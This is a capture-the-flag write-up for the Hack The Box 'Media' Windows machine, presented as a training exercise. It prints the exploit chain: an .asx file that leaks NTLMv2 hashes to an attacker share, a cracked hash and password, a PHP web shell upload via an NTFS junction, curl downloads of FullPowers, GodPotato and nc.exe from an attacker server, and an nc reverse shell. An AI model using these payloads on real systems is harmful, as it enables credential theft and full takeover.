# 📺 HTB Media
```
Machine Information:
Media is a Medium difficulty machine that features an Apache XAMPP stack on Windows hosting a custom PHP web application. The web application allows the upload of a Windows Media Player compatible file that can be leveraged to leak the NTLMv2 hash of the user account that opens it. This hash can be cracked to obtain user credentials that can be used to authenticate to the target via SSH. Upon gaining initial access the source code of the application can be analyzed to determine the generate storage path of uploaded files on the web application which can lead to an NTFS Junction (directory symbolic link) attack to upload a malicious PHP web shell for RCE. Once a shell under the context of the web server's service account, players can abuse the SeTcbPrivilege - Act as part of the operating system, a Windows privilege that lets code impersonate any user and achieve administrative privileges. Alternative methods for privilege escalation involve regaining the SeImpersonate privilege to elevate to NT Authority\SYSTEM.
```
# 📝 Summary
Media is a medium difficulty machine that focuses on knowing xampp, junction and how to escalate privileges with SeTcbPrivilege.
- We are starting with finding that in the webserver there is an upload button which only allows .asx files to be uploaded.
- After uploading a malicious .asx file they return a ntlm hash for the user enox.
- We get the first flag in the enox desktop and then we need to discover where exactly are the files uploading so that we are able to use junction attack
- After locating junction point and figuring out how the hashes are stored in the MD5 we are able to upload the malicious php web shell which would give us authority of nt authority\local service
- After that we have SeTcbPrivilege as a way to escalate privileges, so we transfer FullPowers.exe, GodPotato-NET4.exe and nc.exe and we get a reverse shell back granting us the administrator rights.

# 🔎 Recon
First i always do the aggressive scan because it is more effective way to discover most of the information(If the ports are not hidden or changed). We have discovered three ports: 22, 80 and 3389. I always start with examining http as we don't have any valuable information about ssh or ms-wbt-server.
```
sudo nmap -sV -A -sV 10.129.234.67 -oA media                      
[sudo] password for kali: 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-22 03:43 -0500
Nmap scan report for 10.129.234.67
Host is up (0.16s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.1.17)
|_http-title: ProMotion Studio
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.1.17
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-11-22T08:43:54+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=MEDIA
| Not valid before: 2026-11-21T08:33:37
|_Not valid after:  2027-05-23T08:33:37
| rdp-ntlm-info: 
|   Target_Name: MEDIA
|   NetBIOS_Domain_Name: MEDIA
|   NetBIOS_Computer_Name: MEDIA
|   DNS_Domain_Name: MEDIA
|   DNS_Computer_Name: MEDIA
|   Product_Version: 10.0.20348
|_  System_Time: 2026-11-22T08:43:49+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
After visiting website we see the upload button with only windows media player as an option to upload filetype
<img width="1848" height="665" alt="image" src="https://github.com/user-attachments/assets/1092239c-21f8-43be-922a-3c134ef48de4" />

I started the burp request and discovered that only .asx files can be uploaded so i crafted a simple payload that would send me back the ntlm hash in my responder.
```
capture.asx
<asx version="3.0">
    <entry>
        <ref href="\\<ip>\share\capture.mp3"/>
    </entry>
</asx>
```

```
Started the responder after uploading the file:
sudo responder -I tun0 -wv
SMB] NTLMv2-SSP Client   : 10.129.234.67
[SMB] NTLMv2-SSP Username : MEDIA\enox
[SMB] NTLMv2-SSP Hash     : <HASH>
```

# Authenticating as enox and escalating priviliges 
### 🐈 Using hashcat to get the credentials for the user enox
```
hashcat -m 5600 hash1 /home/kali/Desktop/rockyou.txt
hashcat (v7.1.2) starting
ENOX::MEDIA:7f716ad3a1b57081:1c9b9a717f424354312816950b6d3963:01010000000000008025d44b367add012dabe15405f810b70000000002000800420048003100440001001e00570049004e002d003300550048004600390051004600460042004700460004003400570049004e002d00330055004800460039005100460046004200470046002e0042004800310044002e004c004f00430041004c000300140042004800310044002e004c004f00430041004c000500140042004800310044002e004c004f00430041004c00070008008025d44b367add01060004000200000008003000300000000000000000000000003000005ace49a8749018a599cb2c6abbd0c349cc9726c333a97e5c8081dc46fb44fb5e0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310035002e0032000000000000000000:1234virus@
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ENOX::MEDIA:7f716ad3a1b57081:1c9b9a717f424354312816...000000
Time.Started.....: Sun Nov 22 04:04:53 2026 (11 secs)
Time.Estimated...: Sun Nov 22 04:05:04 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/home/kali/Desktop/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1169.5 kH/s (2.28ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13340672/14344385 (93.00%)
Rejected.........: 0/13340672 (0.00%)
Restore.Point....: 13336576/14344385 (92.97%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 12359331 -> 12345yoyoy
Hardware.Mon.#01.: Util: 76%

we get the password 1234virus@
```
Then we log in with ssh into the user
```
ssh enox@10.129.234.67

enox@MEDIA C:\Users\enox>cd Desktop

enox@MEDIA C:\Users\enox\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\Users\enox\Desktop

10/02/2023  10:04 AM    <DIR>          .
10/02/2023  09:26 AM    <DIR>          ..
11/22/2026  12:34 AM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   7,320,190,976 bytes free

enox@MEDIA C:\Users\enox\Desktop>type user.txt
<flag N#1>
```
Now in order to get the RCE using junction we need to know the following: what is the base directory of where the files uploaded, what is the hashing algorithm mechanism, and which xampp directory the junction link needs to be in order to gain the web root.

For the first two we need to check the index.php source code:
```
PS C:\xampp\htdocs> Select-String -Path C:\xampp\htdocs\index.php -Pattern "uploadDir"

index.php:5:    $uploadDir = 'C:/Windows/Tasks/Uploads/'; // Base upload directory
index.php:16:        $targetDir = $uploadDir . $folderName . '/';
index.php:35:            $todoFile = $uploadDir . 'todo.txt';


PS C:\xampp\htdocs> Select-String -Path C:\xampp\htdocs\index.php -Pattern "hash"     

index.php:12:        // Create a folder name using the MD5 hash of Firstname + Lastname + Email
```
Now we proceed to creating a hash using the format(in my case i created Firstname = test Lastname = test Email=test1@gmail.com)
```
echo -n "testtesttest1@gmail.com" | md5sum
```
I copied the hash and linked the uploading directory to the htdocs(which is the link that will enable us to gain the web root)
```
cmd /c mklink /J "C:\Windows\Tasks\Uploads\439291cb256c986d00b6fbc1b851a4ed" "C:\xampp\htdocs"
```

Then i uploaded the simple php shell in the burpsuite(changed the .asx to shell.php)
```
POST /index.php HTTP/1.1
Host: 10.129.234.67
Content-Length: 636
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMHnMmaw7bbyzLchF
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://10.129.234.67
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.234.67/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryMHnMmaw7bbyzLchF
Content-Disposition: form-data; name="firstname"

test
------WebKitFormBoundaryMHnMmaw7bbyzLchF
Content-Disposition: form-data; name="lastname"

test
------WebKitFormBoundaryMHnMmaw7bbyzLchF
Content-Disposition: form-data; name="email"

test1@gmail.com
------WebKitFormBoundaryMHnMmaw7bbyzLchF
Content-Disposition: form-data; name="fileToUpload"; filename="shell.php"
Content-Type: audio/x-ms-asx

<?php system($_GET['cmd']); ?>

------WebKitFormBoundaryMHnMmaw7bbyzLchF
Content-Disposition: form-data; name="submit"

Upload File
------WebKitFormBoundaryMHnMmaw7bbyzLchF--

```

and then i had access to the web server as the **nt authority\local service**

# Privilege escalation to Administrator
After getting access as nt authority\local service we can check our privileges:
```
shell.php?cmd=whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeTcbPrivilege                Act as part of the OS          Disabled
SeChangeNotifyPrivilege       Bypass traverse checking        Enabled
SeCreateGlobalPrivilege       Create global objects           Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set  Disabled
SeTimeZonePrivilege           Change the time zone            Disabled
```

We have SeTcbPrivilege available. The LOCAL SERVICE account is also entitled by design to recover SeImpersonatePrivilege using FullPowers.exe. We use that recovered token with GodPotato to impersonate SYSTEM and get a reverse shell.

First we transfer the needed binaries to C:\Windows\Tasks\ using a python HTTP server on our attacker machine:
```
python3 -m http.server 8080

shell.php?cmd=curl+http://10.10.15.2:8080/FullPowers.exe+-o+C:\Windows\Tasks\FullPowers.exe
shell.php?cmd=curl+http://10.10.15.2:8080/GodPotato-NET4.exe+-o+C:\Windows\Tasks\GodPotato-NET4.exe
shell.php?cmd=curl+http://10.10.15.2:8080/nc.exe+-o+C:\Windows\Tasks\nc.exe
```
Then the last trigger chain is proceeded:

```
nc -nvlp 9001

cmd=C:\Windows\Tasks\FullPowers.exe+-c+"C:\Windows\Tasks\GodPotato-NET4.exe+-cmd+\"cmd /c nc.exe <Your ip> 9001 -e cmd.exe\""+-z
```

And viola! after executing the command above we have the administrator rev shell back
```
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is EAD8-5D48

 Directory of C:\Users\Administrator\Desktop

10/02/2023  10:04 AM    <DIR>          .
10/01/2023  10:48 PM    <DIR>          ..
11/22/2026  12:34 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   9,995,288,576 bytes free

C:\Users\Administrator\Desktop>type root.txt
<flag N#2>
